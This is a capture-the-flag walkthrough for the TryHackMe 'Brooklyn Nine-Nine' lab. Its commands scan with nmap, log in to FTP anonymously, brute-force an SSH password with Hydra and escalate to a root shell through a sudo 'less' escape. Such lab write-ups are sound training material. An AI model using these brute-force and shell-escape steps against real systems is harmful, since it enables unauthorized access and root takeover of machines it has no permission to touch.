
# 🧠 Brooklyn99 - TryHackMe Walkthrough

📅 **Date**: July 26, 2020  
🔗 **Room Link**: [Brooklyn Nine-Nine - TryHackMe](https://tryhackme.com/room/brooklynninenine)  
🎯 **Goal**: Gain user and root access; capture the flags.

---

## 🔍 Step 1: Initial Nmap Scan

Scan the target to see open ports and services:

```bash
nmap <ip>
```

Example:

```bash
nmap 10.10.10.123
```

### 📄 Observations:

- **Open Ports**: 21 (FTP), 22 (SSH), 80 (HTTP)
- **FTP**: Anonymous login enabled
- **FTP File**: `note_to_jake.txt`
- **Possible Usernames**: `jake`, `amy`, possibly `holt`

---

## 📁 Step 2: Anonymous FTP Login

Connect to the FTP server:

```bash
ftp <ip>
```

Login details:

- **Username**: `anonymous`
- **Password**: *(just press Enter)*

Then:

```bash
ls
get note_to_jake.txt
```

---

## 🔐 Step 3: Brute-Force Jake's SSH Password

Use Hydra with simple syntax:

```bash
hydra -l jake -P <wordlist> ssh://<ip>
```

Example:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.123
```

---

## 🧑‍💻 Step 4: SSH Access

Login using the credentials found from Hydra:

```bash
ssh jake@<ip>
```

Example:

```bash
ssh jake@10.10.150.247
```

---

## 🏁 Step 5: Find and Read User Flag

Search for the user flag:

```bash
find / -name user.txt 2>/dev/null
```

Found:

```
/home/holt/user.txt
```

Read the flag:

```bash
cat /home/holt/user.txt
```

✅ **Submit the flag**

---

## 🔓 Privilege Escalation using `less` (Sudo Exploit)

### 🧠 What’s the Vulnerability?

The user `jake` can run the binary `/usr/bin/less` with **sudo** and **without a password (NOPASSWD)**:

```bash
sudo -l
```

**Output:**
```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

This means `jake` can execute `less` as root. Since `less` supports shell escapes via `!`, it can be exploited to spawn a **root shell**.

---

### 🛠️ Exploitation Steps

1. Run `less` with sudo on any file (e.g., `/etc/profile`):

```bash
sudo less /etc/profile
```

2. Inside `less`, type the following to spawn a shell:

```
!bash
```

> The `!` command runs a shell command inside `less`. Since `less` is running with `sudo`, this spawns a **root shell**.

---

### ✅ Verify Privilege Escalation

After running `!bash`, check if you are root:

```bash
whoami
```

**Expected output:**
```
root
```

---

### 📋 Full Command Sequence

```bash
# Step 1: View sudo permissions
sudo -l

# Step 2: Exploit less with sudo
sudo less /etc/profile

# Step 3: Inside less, type:
!bash

# Step 4: Confirm root shell
whoami
```
